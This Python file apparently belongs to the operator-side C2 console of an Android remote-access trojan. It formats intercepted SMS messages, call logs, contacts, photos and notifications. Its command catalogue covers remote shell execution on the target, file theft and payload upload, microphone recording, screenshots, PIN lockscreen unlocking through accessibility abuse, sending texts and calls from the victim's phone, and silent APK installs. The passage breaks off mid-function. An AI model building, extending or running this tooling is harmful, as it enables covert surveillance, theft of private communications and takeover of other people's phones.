        ("#", {"style": "dim", "width": 4}),
        ("Type", {"width": 12, "justify": "center"}),
        ("Number", {"style": "bold white", "width": 18}),
        ("Date", {"style": "dim", "width": 26}),
        ("Duration", {"style": "yellow", "justify": "right", "width": 10}),
    ]
    show_paginated_table("PHONE CALL LOG", columns, rows, page_size=20, start_page=page)


def format_apps(raw_text, page=1):
    if not raw_text or raw_text.startswith("ERR"):
        show_result(raw_text)
        return
    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
    if lines and lines[0].startswith("OK"):
        lines[0] = lines[0][3:].strip()
    lines = sorted(set(ln for ln in lines if ln))

    rows = []
    for idx, pkg in enumerate(lines, 1):
        is_system = pkg.startswith(("com.android.", "android", "com.google.android.", "com.qualcomm.", "com.sec."))
        type_badge = "[dim]system[/dim]" if is_system else "[bold green]user[/bold green]"
        pkg_style = "[white]" if is_system else "[bold cyan]"
        rows.append((str(idx), f"{pkg_style}{escape(pkg)}[/]", type_badge))

    columns = [
        ("#", {"style": "dim", "width": 5}),
        ("Package Name", {"style": "white"}),
        ("Type", {"width": 10, "justify": "center"}),
    ]
    show_paginated_table("INSTALLED PACKAGES", columns, rows, page_size=25, start_page=page)


def format_photos(raw_text, page=1):
    if not raw_text or raw_text.startswith("ERR"):
        show_result(raw_text)
        return
    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
    if lines and lines[0].startswith("OK"):
        lines[0] = lines[0][3:].strip()
    lines = [ln for ln in lines if ln]

    rows = []
    for idx, ln in enumerate(lines, 1):
        parts = ln.rsplit(" ", 6)
        if len(parts) == 2:
            path = parts[0]
            date_str = parts[1]
        elif len(parts) > 1:
            path = parts[0]
            date_str = " ".join(parts[1:])
        else:
            path = ln
            date_str = "-"
        rows.append((str(idx), escape(path), escape(date_str)))

    columns = [
        ("#", {"style": "dim", "width": 4}),
        ("Photo Path", {"style": "green"}),
        ("Date Added", {"style": "dim", "width": 26}),
    ]
    show_paginated_table("MEDIA PHOTOS", columns, rows, page_size=20, start_page=page)


def format_notifs(raw_text, page=1):
    if not raw_text or raw_text.startswith("ERR"):
        show_result(raw_text)
        return
    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
    if lines and lines[0].startswith("OK"):
        lines[0] = lines[0][3:].strip()
    lines = [ln for ln in lines if ln]

    rows = []
    for ln in lines:
        parts = ln.split(" ", 2)
        if len(parts) >= 3 and ":" in parts[1]:
            ts = f"{parts[0]} {parts[1]}"
            rest = parts[2]
            p_parts = rest.split(" ", 1)
            pkg = p_parts[0]
            content = p_parts[1] if len(p_parts) > 1 else ""
        elif len(parts) >= 2:
            ts = parts[0]
            pkg = parts[1]
            content = parts[2] if len(parts) > 2 else ""
        else:
            ts = "-"
            pkg = "-"
            content = ln
        rows.append((escape(ts), escape(pkg), escape(content)))

    columns = [
        ("Time", {"style": "dim", "width": 14}),
        ("Package", {"style": "cyan", "width": 22}),
        ("Content", {"style": "white"}),
    ]
    show_paginated_table("INTERCEPTED NOTIFICATIONS", columns, rows, page_size=20, start_page=page)


def format_ls(raw_text, path="/sdcard", page=1):
    if not raw_text or raw_text.startswith("ERR"):
        show_result(raw_text)
        return
    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
    if lines and lines[0].startswith("OK"):
        lines[0] = lines[0][3:].strip()
    lines = sorted([ln for ln in lines if ln])

    rows = []
    for item in lines:
        is_dir = item.endswith("/")
        icon = "[bold cyan]DIR[/bold cyan]" if is_dir else "[dim]FILE[/dim]"
        name_style = "[bold cyan]" if is_dir else "[white]"
        rows.append((icon, f"{name_style}{escape(item)}[/]"))

    columns = [
        ("Type", {"width": 6, "justify": "center"}),
        ("Name", {"style": "white"}),
    ]
    show_paginated_table(f"DIRECTORY · {escape(path or '/sdcard')}", columns, rows, page_size=25, start_page=page)


def format_info(raw_text):
    if not raw_text or raw_text.startswith("ERR"):
        show_result(raw_text)
        return
    text = raw_text
    if text.startswith("OK"):
        text = text[2:].strip()

    fields = {}
    for token in text.split():
        if "=" in token:
            k, v = token.split("=", 1)
            fields[k.strip()] = v.strip()

    t = Table(title="[bold cyan]DEVICE SYSTEM INFO[/bold cyan]", box=box.ROUNDED, border_style="cyan", header_style="bold magenta", expand=False)
    t.add_column("Property", style="bold cyan", width=18)
    t.add_column("Value", style="white")

    t.add_row("Model / Brand", f"{fields.get('model', '?')} [dim](Android SDK {fields.get('sdk', '?')})[/dim]")
    batt = fields.get("battery_pct", "?")
    charging = fields.get("charging", "false")
    batt_style = "green" if batt.isdigit() and int(batt) > 20 else "red"
    charge_str = " [green](charging)[/green]" if charging == "true" else " [dim](discharging)[/dim]"
    t.add_row("Battery", f"[{batt_style}]{batt}%[/]{charge_str}")

    ram_tot = fields.get("ram_total_mb")
    ram_avail = fields.get("ram_avail_mb")
    if ram_tot and ram_avail:
        t.add_row("Memory (RAM)", f"{int(ram_avail):,} MB free / {int(ram_tot):,} MB total")

    stor_tot = fields.get("storage_total_gb")
    stor_avail = fields.get("storage_avail_gb")
    if stor_tot and stor_avail:
        t.add_row("Storage", f"{stor_avail} GB free / {stor_tot} GB total")

    uptime = fields.get("uptime_s")
    if uptime and uptime.isdigit():
        s = int(uptime)
        t.add_row("Uptime", fmt_age(s))

    ips = fields.get("ips")
    if ips:
        t.add_row("IP Addresses", escape(ips.replace(",", ", ")))

    console.print(t)
    console.print()


def format_perms(raw_text):
    if not raw_text or raw_text.startswith("ERR"):
        show_result(raw_text)
        return
    lines = [ln.strip() for ln in raw_text.splitlines() if ln.strip()]
    if lines and lines[0].startswith("OK"):
        lines[0] = lines[0][3:].strip()
    lines = [ln for ln in lines if ln]

    rows = []
    for ln in lines:
        if "=" in ln:
            p, st = ln.split("=", 1)
        elif ": " in ln:
            p, st = ln.split(": ", 1)
        else:
            p, st = ln, "?"
        p_clean = p.replace("android.permission.", "")
        status_badge = "[bold green]GRANTED[/bold green]" if "grant" in st.lower() else "[bold red]DENIED[/bold red]"
        rows.append((escape(p_clean), status_badge))

    columns = [
        ("Permission", {"style": "bold white"}),
        ("Status", {"width": 12, "justify": "center"}),
    ]
    show_paginated_table("DEVICE PERMISSIONS", columns, rows, page_size=20)


def cmd_log(page=1, force_refresh=False):
    """Retrieve and display actual intercepted SMS messages in a paginated table."""
    cid = ACTIVE["id"]
    if not cid:
        ev("!", "no active session — run: /use", "yellow")
        return

    tag = alias_tag(cid)
    cached_entries = CACHE.get(cid, "PARSED_SMS_LOGS")
    if cached_entries is not None and not force_refresh:
        ev("⚡", f"displaying cached SMS logs  [dim]({tag} · add --refresh to update)[/dim]", "dim cyan")
        records = cached_entries
    else:
        raw_list = send_and_wait("LOG", use_cache=not force_refresh, force_refresh=force_refresh)
        if not raw_list or raw_list.startswith("ERR"):
            show_result(raw_list)
            return
        if "no logs" in raw_list.lower():
            show_paginated_table("INTERCEPTED SMS MESSAGES", [
                ("#", {"style": "dim", "width": 4}),
                ("Time", {"style": "dim", "width": 20}),
                ("From", {"style": "bold cyan", "width": 16}),
                ("Message", {"style": "white"}),
            ], [])
            return

        lines = [ln.strip() for ln in raw_list.splitlines() if ln.strip()]
        if lines and lines[0].startswith("OK"):
            lines[0] = lines[0][3:].strip()
        files = [ln for ln in lines if ln and ln != "no logs"]
        if not files:
            show_paginated_table("INTERCEPTED SMS MESSAGES", [
                ("#", {"style": "dim", "width": 4}),
                ("Time", {"style": "dim", "width": 20}),
                ("From", {"style": "bold cyan", "width": 16}),
                ("Message", {"style": "white"}),
            ], [])
            return

        records = []
        with Progress(
            SpinnerColumn(spinner_name="dots", style="cyan"),
            TextColumn("[bold cyan]{task.description}[/bold cyan]"),
            BarColumn(bar_width=25, style="dim", complete_style="bold cyan"),
            TextColumn("[bold green]{task.completed}[/bold green]/{task.total}"),
            console=console,
            transient=True,
        ) as progress:
            task = progress.add_task("Retrieving intercepted SMS data...", total=len(files))
            for f in sorted(files, reverse=True):
                content = CACHE.get(cid, f"SMSLOG_{f}")
                if content is None or force_refresh:
                    content = send_and_wait(f"SMSLOG {f}", use_cache=False)
                    if content:
                        CACHE.set(cid, f"SMSLOG_{f}", content)

                ts_display = "-"
                m = re.search(r"sms_(\d{4})(\d{2})(\d{2})_(\d{2})(\d{2})(\d{2})", f)
                if m:
                    ts_display = f"{m.group(1)}-{m.group(2)}-{m.group(3)} {m.group(4)}:{m.group(5)}:{m.group(6)}"

                sender = "?"
                body = ""
                if content and not content.startswith("ERR"):
                    clean = content[3:].strip() if content.startswith("OK") else content.strip()
                    lines_c = clean.splitlines()
                    for idx_l, ln in enumerate(lines_c):
                        if ln.startswith("from="):
                            sender = ln[5:].strip()
                            body = "\n".join(lines_c[idx_l + 1:]).strip()
                            break
                    if not body and clean:
                        body = clean

                records.append({
                    "time": ts_display,
                    "from": sender,
                    "body": body,
                    "file": f,
                })
                progress.advance(task)

        CACHE.set(cid, "PARSED_SMS_LOGS", records)

    rows = []
    for idx, r in enumerate(records, 1):
        rows.append((str(idx), escape(r["time"]), escape(r["from"]), escape(r["body"])))

    columns = [
        ("#", {"style": "dim", "width": 4}),
        ("Time", {"style": "dim", "width": 20}),
        ("From", {"style": "bold cyan", "width": 16}),
        ("Message", {"style": "white"}),
    ]
    show_paginated_table("INTERCEPTED SMS MESSAGES", columns, rows, page_size=15, start_page=page)


def format_log(raw_text, page=1):
    """Backwards-compatible wrapper: parses log list and displays actual SMS records."""
    cmd_log(page=page)


def format_smslog(raw_text):
    if not raw_text or raw_text.startswith("ERR"):
        show_result(raw_text)
        return
    clean = raw_text[3:].strip() if raw_text.startswith("OK") else raw_text.strip()
    sender = "?"
    body = clean
    lines = clean.splitlines()
    for idx, ln in enumerate(lines):
        if ln.startswith("from="):
            sender = ln[5:].strip()
            body = "\n".join(lines[idx + 1:]).strip()
            break

    t = Table(title="[bold cyan]INTERCEPTED SMS RECORD[/bold cyan]", box=box.ROUNDED, border_style="cyan", header_style="bold magenta", expand=False)
    t.add_column("Field", style="bold cyan", width=12)
    t.add_column("Value", style="white")
    t.add_row("Sender", f"[bold green]{escape(sender)}[/bold green]")
    t.add_row("Message", escape(body))
    console.print(t)
    console.print()


def cmd_smslog(target=None):
    if not target:
        cmd_log(page=1)
        return
    cid = ACTIVE["id"]
    if not cid:
        ev("!", "no active session — run: /use", "yellow")
        return
    res = send_and_wait(f"SMSLOG {target}")
    format_smslog(res or "")


def cmd_cache(args):
    sub = args[0].lower() if args else "list"
    subargs = args[1:]
    if sub in ("list", "ls"):
        items = CACHE.items()
        rows = []
        for idx, it in enumerate(items, 1):
            rows.append((
                str(idx),
                escape(alias_tag(it["cid"])),
                escape(it["cmd"]),
                f"{int(it['age'])}s ago",
                f"{it['size']:,} B",
            ))
        columns = [
            ("#", {"style": "dim", "width": 4}),
            ("Session", {"style": "bold cyan", "width": 16}),
            ("Command", {"style": "white", "width": 24}),
            ("Age", {"style": "dim", "width": 12}),
            ("Size", {"style": "green", "justify": "right"}),
        ]
        page = int(subargs[0]) if subargs and subargs[0].isdigit() else 1
        show_paginated_table("RESULT CACHE", columns, rows, page_size=20, start_page=page)
        console.print("  [dim]Clear with: [bold cyan]/cache clear[/bold cyan] · bypass with [bold]--refresh[/bold][/dim]\n")
    elif sub == "clear":
        target = subargs[0] if subargs else None
        target_cid = resolve_tag(target) if target else None
        count = CACHE.invalidate(target_cid)
        ok(f"purged {count} cached entry/entries" + (f" for [cyan]{escape(target)}[/cyan]" if target else ""))
    else:
        usage("cache [list|clear] [target]")


def format_history(start_page=1):
    total = readline.get_current_history_length()
    rows = []
    for i in range(1, total + 1):
        item = readline.get_history_item(i)
        if item:
            rows.append((str(i), escape(item)))
    columns = [
        ("#", {"style": "dim", "width": 5, "justify": "right"}),
        ("Command", {"style": "white"}),
    ]
    show_paginated_table("COMMAND HISTORY", columns, rows, page_size=25, start_page=start_page)


# ─────────────────────────── command dispatch ─────────────────────────

COMMAND_INFO = {
    # session
    "sessions": ("session", "/sessions", "List connected sessions with status & stats",
                 "Aliases: /list, /clients\nDisplays session ID, alias, device model, online status, last seen age, queued commands, and last result preview."),
    "use": ("session", "/use [<id>|alias|#]", "Select active session & arm fastpoll",
            "Switches active session to target. If no argument is given, lists sessions interactively.\nAutomatically queues a FASTPOLL command so the agent polls at ~0.7s intervals."),
    "result": ("session", "/result", "Show active session's last command result",
               "Re-displays the complete output of the last command executed on the currently active session."),
    "results": ("session", "/results", "Show last result from every session",
                "Prints a summary of the most recent result received from each known agent."),
    "all": ("session", "/all <op...>", "Broadcast command to all connected sessions",
            "Alias: /broadcast\nQueues the command on every connected session.\nExample:\n  /all ping\n  /all fastpoll 30"),
    "fastpoll": ("session", "/fastpoll [secs]", "Arm rapid beaconing on active agent",
                 "Requests the agent to beacon at high frequency (~0.7s) for the specified seconds (default: 120s)."),
    # manage
    "rename": ("manage", "/rename <id|tag> <new-tag>", "Assign friendly alias to a session",
               "Renames a session ID or existing alias to a new label. Aliases persist in ~/.androremote/aliases.json.\nExample:\n  /rename c83f12ab target_phone"),
    "forget": ("manage", "/forget <id|tag>", "Remove session from tracking",
               "Removes session from memory and aliases. If the agent beacons again, it will be re-registered as new."),
    "history": ("manage", "/history [page]", "Display REPL command history (paginated)",
                "Shows numbered list of previously entered operator commands with pagination support."),
    "status": ("manage", "/status", "Display C2 server health & tunnel info",
               "Displays listener port, TLS state, crypto key fingerprint, tunnel URL and process status, uptime, and active session count."),
    "clear": ("manage", "/clear", "Clear console screen",
              "Clears the terminal display."),
    "plugins": ("manage", "/plugins", "List loaded plugins and their commands",
                "Aliases: /plugin\nDisplays loaded modular plugins, author, version, and status.\nUse /plugin info|load|unload|reload for management."),
    "cache": ("manage", "/cache [list|clear] [target]", "Inspect or clear in-memory command result cache",
              "Displays currently cached device query responses (info, perms, apps, contacts, logs, etc.) or clears cached items.\nExample:\n  /cache\n  /cache clear"),
    "ping": ("recon", "/ping", "Test agent responsiveness (returns PONG)",
             "Sends PING to active agent. Verifies round-trip beacon latency and agent liveness."),
    "id": ("recon", "/id", "Query device model, brand & SDK version",
           "Returns device manufacturer, product name, model string, and Android API SDK level."),
    "info": ("recon", "/info", "Query device hardware, OS & battery info",
             "Gathers system properties, hardware board, OS release, and battery state."),
    "perms": ("recon", "/perms", "Check app permissions (SMS, camera, etc.)",
              "Displays granted and denied runtime permissions in a formatted table."),
    "apps": ("recon", "/apps [page] [limit]", "List user-installed app packages (paginated)",
             "Lists installed packages categorizing system vs user apps with pagination support."),
    "notifs": ("recon", "/notifs [n] [page]", "Read intercepted notifications (paginated)",
              "Retrieves captured notification history formatted with timestamps and package names."),
    "loc": ("recon", "/loc", "Get device GPS / network location fix",
            "Returns latitude, longitude, accuracy, provider, and timestamp of the last known location fix."),
    "calllog": ("recon", "/calllog [n] [page]", "Read call history (paginated)",
                "Displays incoming, outgoing, and missed call history in a formatted table."),
    "photos": ("recon", "/photos [n] [page]", "List newest photos in MediaStore (paginated)",
               "Queries device media store for recent photo paths and addition dates."),
    "contacts": ("recon", "/contacts [n] [page]", "Dump device contacts list (paginated)",
                 "Retrieves phonebook contacts with display names and phone numbers in a formatted table."),
    "smsin": ("recon", "/smsin [n] [page]", "Read inbound SMS messages (paginated)",
              "Reads inbox SMS messages with sender, timestamp, and message body in a formatted table."),
    "shell": ("exec", "/shell <cmd...>", "Execute shell command on target",
              "Executes command on device via Runtime.exec. Output is captured and returned.\nExample:\n  /shell id; getprop ro.product.model"),
    "ls": ("exec", "/ls [path] [page]", "List directory contents on device (paginated)",
           "Lists files and subdirectories in a formatted table with pagination. Defaults to /sdcard."),
    "startapp": ("exec", "/startapp <package>", "Launch application package",
                 "Launches the main launch intent for the specified package.\nExample:\n  /startapp com.android.chrome"),
    "get": ("exec", "/get <remote> <local>", "Download remote file (base64)",
            "Downloads a file from the device and saves it to local path.\nExample:\n  /get /sdcard/DCIM/photo.jpg ./photo.jpg"),
    "put": ("exec", "/put <local> <remote>", "Upload local file to device",
            "Uploads a local file to the specified remote path on device (max 32MB).\nExample:\n  /put ./payload.bin /sdcard/Download/payload.bin"),
    # comms
    "sms": ("comms", "/sms <number> <text>", "Send SMS message from target",
            "Sends an SMS message from the device's default SIM.\nExample:\n  /sms +15551234567 Hello from Android"),
    "call": ("comms", "/call <number>", "Place phone call on speakerphone",
             "Initiates an outgoing phone call with speakerphone enabled.\nExample:\n  /call +15551234567"),
    "log": ("comms", "/log [page] [--refresh]", "Read intercepted incoming SMS messages (paginated table)",
            "Fetches and parses intercepted SMS messages, displaying timestamp, sender, and body in a paginated table.\nExample:\n  /log\n  /log 2\n  /log --refresh"),
    "smslog": ("comms", "/smslog [name]", "View specific intercepted SMS message details",
               "Reads the content of a specific SMS intercept record. If no name given, lists all in a paginated table.\nExample:\n  /smslog\n  /smslog sms_20260904_120000_123.txt"),
    "rec": ("comms", "/rec <secs> [out.wav]", "Record mic audio & download WAV",
            "Records audio from device microphone for specified seconds and downloads it locally.\nExample:\n  /rec 10 mic_sample.wav"),
    # device
    "screen": ("device", "/screen [out.png]", "Capture screenshot via projection",
               "Takes a screenshot using Android MediaProjection service and downloads it.\nExample:\n  /screen device_screen.png"),
    "tap": ("device", "/tap <x> <y>", "Simulate tap at screen coordinates",
            "Simulates touch tap at (x, y) using accessibility service.\nExample:\n  /tap 540 960"),
    "swipe": ("device", "/swipe <x1> <y1> <x2> <y2> [ms]", "Simulate swipe between points",
              "Performs touch drag/swipe gesture. Duration defaults to 300ms.\nExample:\n  /swipe 500 1500 500 500 250"),
    "settext": ("device", "/settext <text>", "Type text into focused input field",
                "Injects text into the currently focused EditText using accessibility."),
    "gaction": ("device", "/gaction <action>", "Perform global system navigation",
                "Triggers Android accessibility global action.\nValid actions: back, home, recents, notifications, quicksettings, power, lock, screenshot\nExample:\n  /gaction home"),
    "wake": ("device", "/wake [secs]", "Wake up device screen",
             "Acquires a bright wake lock to turn the screen on (default 10s, max 300s).\nExample:\n  /wake\n  /wake 60"),
    "sleep": ("device", "/sleep", "Lock screen / turn display off",
              "Locks the keyguard and turns the screen off via the accessibility global action (requires axenable).\nAlias for /gaction lock."),
    "unlock": ("device", "/unlock <pin>", "Wake & dismiss PIN keyguard",
               "Wakes the screen, swipes up the lockscreen bouncer, types the PIN via accessibility and confirms. Needs accessibility service.\nBest-effort — OEM lockscreen implementations vary.\nExample:\n  /unlock 4821"),
    "vol": ("device", "/vol [level|up|down|mute]", "Get or adjust audio volume",
            "Queries or sets device audio volume.\nExample:\n  /vol up\n  /vol 10"),
    "clipset": ("device", "/clipset <text>", "Set device clipboard text",
                "Pushes text to Android clipboard."),
    "clipget": ("device", "/clipget", "Read device clipboard text",
                "Retrieves current string in Android clipboard."),
    "torch": ("device", "/torch <on|off>", "Toggle camera flashlight",
              "Turns camera flash LED on or off.\nExample:\n  /torch on"),
    "vibrate": ("device", "/vibrate [ms]", "Trigger vibration (default 500ms)",
                "Vibrates device for specified milliseconds.\nExample:\n  /vibrate 1000"),
    # upkeep
    "build": ("upkeep", "/build [url]", "Compile, sign & package agent APK",
              "Runs build.sh to package the agent APK. Auto-bakes the active C2 tunnel URL and encryption key.\nExample:\n  /build\n  /build https://c2.threatvector.tech"),
    "update": ("upkeep", "/update <local.apk>", "Push & install APK update",
               "Uploads an APK to device and invokes silent package installer.\nExample:\n  /update build/apk/androremote.apk"),
    "installstatus": ("upkeep", "/installstatus", "Check status of last APK install",
                      "Queries the result of the most recent package installation."),
    # server
    "help": ("server", "/help [command]", "Show command matrix or command details",
             "Alias: /?\nDisplays full categorized command table, or detailed help and examples for a specific command.\nExample:\n  /help\n  /help shell\n  /help gaction"),
    "quit": ("server", "/quit", "Exit C2 server & shut down tunnel",
             "Aliases: /exit, /q\nTerminates C2 server listener, stops cloudflared tunnel process, and exits."),
}


def cmd_help(target=None):
    if target:
        t_clean = target.lstrip("/").lower()
        alias_map = {"list": "sessions", "clients": "sessions", "broadcast": "all", "q": "quit", "exit": "quit", "?": "help", "plugin": "plugins"}
        real_cmd = alias_map.get(t_clean, t_clean)

        # Check built-in commands
        info = COMMAND_INFO.get(real_cmd)
        if info:
            cat, usage_str, desc, details = info
        elif PLUGIN_MANAGER and PLUGIN_MANAGER.has_command(real_cmd):
            _, pcmd = PLUGIN_MANAGER.commands[real_cmd]
            cat, usage_str, desc, details = pcmd.category, pcmd.usage, pcmd.description, pcmd.details
        else:
            err(f"unknown command for help: '{escape(target)}'  [dim](type /help to list all)[/dim]")
            return

        body = (
            f"[bold cyan]Usage:[/] {escape(usage_str)}\n\n"
            f"[bold magenta]Category:[/] {escape(cat)}\n"
            f"[bold white]Description:[/] {escape(desc)}\n"
        )
        if details:
            body += f"\n[dim]{escape(details)}[/dim]"
        p = Panel(
            body,
            title=f"[bold cyan]/{escape(real_cmd)}[/bold cyan]",
            border_style="cyan",
            box=box.ROUNDED,
            padding=(1, 2),
        )
        console.print(p)
        console.print()
        return

    table = Table(
        title="[bold cyan]C2 COMMAND MATRIX[/bold cyan]  [dim]· Tab to autocomplete · prefix with / optional[/dim]",
        box=box.ROUNDED,
        show_header=True,
        header_style="bold magenta",
        border_style="dim",
        padding=(0, 1),
        expand=True,
    )
    table.add_column("Command", style="bold cyan", no_wrap=True)
    table.add_column("Category", style="magenta", no_wrap=True)
    table.add_column("Description", style="white")

    # Combine built-in and plugin commands
    all_cmds = dict(COMMAND_INFO)
    if PLUGIN_MANAGER:
        for cname, (plugin, pcmd) in PLUGIN_MANAGER.commands.items():
            if cname not in all_cmds:
                all_cmds[cname] = (pcmd.category, pcmd.usage, f"[dim][{plugin.name}][/dim] {pcmd.description}", pcmd.details)

    prev_cat = None
    for name, (cat, usage_str, desc, _) in all_cmds.items():
        if prev_cat is not None and cat != prev_cat:
            table.add_section()
        prev_cat = cat
        table.add_row(usage_str, cat, desc)

    console.print(table)
    console.print("  [dim]● all commands work with or without '/' prefix (e.g. /ping or ping)[/dim]")
    console.print("  [dim]● type [bold cyan]/help <command>[/bold cyan] for detailed syntax & examples[/dim]")
    console.print("  [dim]● device ops act on the active session — select with [bold cyan]/use[/bold cyan][/dim]\n")


def cmd_plugin(args):
    sub = args[0].lower() if args else "list"
    subargs = args[1:]
    if not PLUGIN_MANAGER:
        err("plugin manager not initialized")
        return

    if sub in ("list", "ls"):
        table = Table(
            title="[bold cyan]LOADED PLUGINS[/bold cyan]",
            box=box.ROUNDED,
            header_style="bold magenta",
            border_style="cyan",
            expand=True,
        )
        table.add_column("Plugin", style="bold cyan", width=14)
        table.add_column("Ver", style="dim", width=8)
        table.add_column("Commands", style="white", width=22)
        table.add_column("Description", style="white")
        table.add_column("Status", width=10, justify="center")

        if not PLUGIN_MANAGER.plugins:
            table.add_row("-", "-", "-", "[dim]No plugins loaded[/dim]", "-")
        else:
            for name, p in PLUGIN_MANAGER.plugins.items():
                cmds = ", ".join(f"/{c.name}" for c in p._commands) or "[dim]none[/dim]"
                status = "[bold green]enabled[/bold green]" if p.enabled else "[bold red]disabled[/bold red]"
                table.add_row(name, p.version, cmds, p.description, status)

        console.print(table)
        console.print("  [dim]Commands: [bold cyan]/plugin info <name>[/bold cyan] · [bold cyan]/plugin load <path>[/bold cyan] · [bold cyan]/plugin unload <name>[/bold cyan] · [bold cyan]/plugin reload [name][/bold cyan][/dim]\n")

    elif sub == "info":
        if not subargs:
            usage("plugin info <name>")
            return
        pname = subargs[0]
        p = PLUGIN_MANAGER.plugins.get(pname)
        if not p:
            err(f"plugin not found: '{pname}'")
            return
        cmds_info = "\n".join(f"  [bold cyan]/{c.name}[/bold cyan] - {escape(c.description)}" for c in p._commands) or "  [dim]None[/dim]"
        hooks_list = []
        for hname, handlers in PLUGIN_MANAGER.hooks.items():
            if any(pl == p for pl, _ in handlers):
                hooks_list.append(hname)
        hooks_info = ", ".join(hooks_list) or "[dim]None[/dim]"

        body = (
            f"[bold cyan]Name:[/] {p.name}\n"
            f"[bold cyan]Version:[/] {p.version}\n"
            f"[bold cyan]Author:[/] {p.author}\n"
            f"[bold cyan]Description:[/] {escape(p.description)}\n\n"
            f"[bold magenta]Registered Commands:[/]\n{cmds_info}\n\n"
            f"[bold magenta]Event Hooks:[/]\n  {hooks_info}\n"
        )
        pnl = Panel(body, title=f"[bold cyan]PLUGIN: {escape(p.name)}[/bold cyan]", border_style="cyan", box=box.ROUNDED, padding=(1, 2))
        console.print(pnl)

    elif sub == "load":
        if not subargs:
            usage("plugin load <path>")
            return
        path = subargs[0]
        res = PLUGIN_MANAGER.load_from_file(path)
        if res:
            ok(f"loaded plugin: [bold cyan]{res.name}[/bold cyan]")
        else:
            err(f"failed loading plugin from: {path}")

    elif sub == "unload":
        if not subargs:
            usage("plugin unload <name>")
            return
        pname = subargs[0]
        if PLUGIN_MANAGER.unload_plugin(pname):
            ok(f"unloaded plugin: [bold cyan]{pname}[/bold cyan]")
        else:
            err(f"plugin not found: '{pname}'")

    elif sub == "reload":
        if not subargs:
            for pname in list(PLUGIN_MANAGER.plugins.keys()):
                PLUGIN_MANAGER.reload_plugin(pname)
            ok("reloaded all plugins")
        else:
            pname = subargs[0]
            if PLUGIN_MANAGER.reload_plugin(pname):
                ok(f"reloaded plugin: [bold cyan]{pname}[/bold cyan]")
            else:
                err(f"failed to reload plugin: '{pname}'")
    else:
        usage("plugin [list|info|load|unload|reload]")


def complete_filepath(text):
    expanded = os.path.expanduser(text)
    if not text:
        dirname = "."
        prefix = ""
    elif text.endswith("/"):
        dirname = expanded
        prefix = ""
    else:
        dirname = os.path.dirname(expanded) or "."
        prefix = os.path.basename(expanded)
    try:
        entries = os.listdir(dirname)
    except OSError:
        return []
    results = []
    base_display = os.path.dirname(text)
    for entry in entries:
        if entry.startswith(".") and not prefix.startswith("."):
            continue
        if entry.startswith(prefix):
            full_path = os.path.join(dirname, entry)
            is_dir = os.path.isdir(full_path)
            disp_path = os.path.join(base_display, entry) if base_display else entry
            cand = disp_path + ("/" if is_dir else "")
            results.append(cand)
    return results


def _compute_completions(text):
    line = readline.get_line_buffer()
    begidx = readline.get_begidx()
    lead = line[:begidx]
    tokens = lead.strip().split()

    # Completing command itself
    if not tokens or (len(tokens) == 1 and not lead.endswith(" ")):
        all_ops = list(COMMAND_INFO.keys()) + ["list", "clients", "broadcast", "exit", "q", "plugin"]
        if PLUGIN_MANAGER:
            all_ops += list(PLUGIN_MANAGER.commands.keys())
        all_ops = sorted(set(all_ops))
        if text.startswith("/"):
            return [f"/{cmd}" for cmd in all_ops if f"/{cmd}".startswith(text)]
        else:
            return [cmd for cmd in all_ops if cmd.startswith(text)]

    # Completing arguments
    cmd = tokens[0].lstrip("/").lower()
    arg_idx = len(tokens) if lead.endswith(" ") else len(tokens) - 1

    if cmd in ("use", "forget") and arg_idx == 1:
        with LOCK:
            known = list(CLIENTS.keys()) + list(ALIASES.values())
        return [s for s in sorted(set(known)) if s.startswith(text)]

    if cmd == "rename" and arg_idx == 1:
        with LOCK:
            known = list(CLIENTS.keys()) + list(ALIASES.values())
        return [s for s in sorted(set(known)) if s.startswith(text)]

    if cmd in ("help", "?") and arg_idx == 1:
        all_ops = list(COMMAND_INFO.keys())
        if PLUGIN_MANAGER:
            all_ops += list(PLUGIN_MANAGER.commands.keys())
        all_ops = sorted(set(all_ops))
        if text.startswith("/"):
            return [f"/{c}" for c in all_ops if f"/{c}".startswith(text)]
        return [c for c in all_ops if c.startswith(text)]

    if cmd in ("plugin", "plugins") and arg_idx == 1:
        subcmds = ["list", "info", "load", "unload", "reload"]
        return [s for s in subcmds if s.startswith(text)]

    if cmd in ("plugin", "plugins") and arg_idx == 2:
        if tokens[1] in ("info", "unload", "reload") and PLUGIN_MANAGER:
            return [p for p in sorted(PLUGIN_MANAGER.plugins.keys()) if p.startswith(text)]
        if tokens[1] == "load":
            return complete_filepath(text)

    if cmd == "gaction" and arg_idx == 1:
        actions = ["back", "home", "recents", "notifications", "quicksettings", "power", "lock", "screenshot"]
        return [a for a in actions if a.startswith(text)]

    if cmd == "torch" and arg_idx == 1:
        return [s for s in ("on", "off") if s.startswith(text)]

    if cmd == "vol" and arg_idx == 1:
        return [s for s in ("up", "down", "mute") if s.startswith(text)]

    if cmd in ("all", "broadcast") and arg_idx == 1:
        all_ops = [c for c, (cat, _, _, _) in COMMAND_INFO.items() if cat in ("recon", "exec", "device")]
        if text.startswith("/"):
            return [f"/{c}" for c in sorted(all_ops) if f"/{c}".startswith(text)]
        return [c for c in sorted(all_ops) if c.startswith(text)]

    if cmd in ("put", "update") and arg_idx == 1:
        return complete_filepath(text)
    if cmd == "get" and arg_idx == 2:
        return complete_filepath(text)
    if cmd == "screen" and arg_idx == 1:
        return complete_filepath(text)
    if cmd == "rec" and arg_idx == 2:
        return complete_filepath(text)
    if cmd == "cache" and arg_idx == 1:
        return [s for s in ("list", "clear") if s.startswith(text)]
    if cmd == "cache" and arg_idx == 2 and tokens[1] == "clear":
        with LOCK:
            known = list(CLIENTS.keys()) + list(ALIASES.values())
        return [s for s in sorted(set(known)) if s.startswith(text)]
    if cmd in ("info", "perms", "apps", "contacts", "notifs", "loc", "calllog", "photos", "smsin", "log") and arg_idx >= 1:
        if "--refresh".startswith(text):
            return ["--refresh"]
    if cmd == "build" and arg_idx == 1:
        cands = []
        if TUNNEL.get("url"):
            cands.append(TUNNEL["url"])
        cfg = tunnel_named_cfg()
        if cfg and cfg.get("hostname"):
            cands.append(f"https://{cfg['hostname']}")
        return [u for u in cands if u.startswith(text)]
    if cmd == "triage" and arg_idx == 1:
        return [s for s in ("all", "info", "perms", "net", "notifs") if s.startswith(text)]
    if cmd == "hunt" and arg_idx == 1:
        return [s for s in ("docs", "keys", "db", "archives", "images") if s.startswith(text)]
    if cmd == "hunt" and arg_idx == 2:
